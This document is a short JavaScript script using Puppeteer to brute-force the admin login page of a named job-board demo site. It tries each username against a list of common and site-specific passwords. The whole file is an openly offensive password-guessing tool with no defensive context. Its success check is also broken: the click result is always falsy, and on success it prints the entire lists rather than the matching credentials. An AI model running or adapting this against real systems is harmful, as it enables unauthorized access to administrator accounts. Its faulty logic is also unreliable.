const puppeteer = require('puppeteer');
const adminPage = "https://demo.simplejobscript.com/sjs-admin/"
const usernameList = ["admin","root"]
const passwordList = ["admin","password","god","ethiopia","ethiojobs"]


async function run(adminPage) {
// setting up a headless chrome browser        
    const browser = await puppeteer.launch({
        headless: false,
        defaultViewport: null,
        executablePath: '/usr/bin/chromium-browser',
        args: ["--disable-notifications"]
    });
    const page = await browser.newPage();
    page.setDefaultNavigationTimeout(100000);
    await page.goto(adminPage, {waitUntil: 'networkidle2', waitUntil: 'load'});

    const clear = async function ( selector) {
        await this.evaluate(selector => {
          document.querySelector(selector).value = "";
        }, selector);
      };

    page.clear = clear;
    
    for (let i = 0; i < usernameList.length; i++) {       
        for (let j = 0; j < passwordList.length; j++) {
            await page.clear('input[type="text"]')
            await page.type('input[type="text"]', usernameList[i]);
            await page.clear('input[type="password"]');
            await page.type('input[type="password"]', passwordList[j]);
            const response = await page.click('#submit');
            if(response){
                console.log('Success..... ' + 'username: ' + usernameList + 'password: ' + passwordList)
                browser.close
            } else {
                console.log('failed');
                
            }
        }   
    }
}

run(adminPage)